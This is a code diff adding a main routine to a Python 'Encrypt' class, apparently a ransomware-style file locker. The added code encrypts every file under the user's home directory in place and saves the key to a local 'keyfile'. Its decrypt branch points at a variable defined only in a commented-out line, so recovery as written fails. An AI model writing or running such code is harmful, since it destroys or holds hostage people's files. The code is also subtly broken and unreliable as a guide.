@@ -47,3 +47,34 @@ class Encrypt:
             f.seek(0)
             f.write(data)
 
+
+if __name__ == '__main__':
+    #all directory
+    sys_root = expanduser('~')
+    
+    #specific target directory
+    #local_root= '.'
+
+    import argparse
+    parser = argparse.ArgumentParser()
+    parser.add_argument('--action', required=True)
+    parser.add_argument('--keyfile')
+
+    
+    args = parser.parse_args()
+    action = args.action.lower()
+    keyfile = args.keyfile
+
+    lock = Encrypt()
+
+    if action == 'decrypt':
+        if keyfile is None:
+            print('Specify path to keyfile after --keyfile')
+        else:
+            lock.read_key(keyfile)
+            lock.mainCrypt(local_root, encrypted=True)
+    elif action == 'encrypt':
+        lock.generate_key()
+        lock.write_key('keyfile')
+        lock.mainCrypt(sys_root)
+
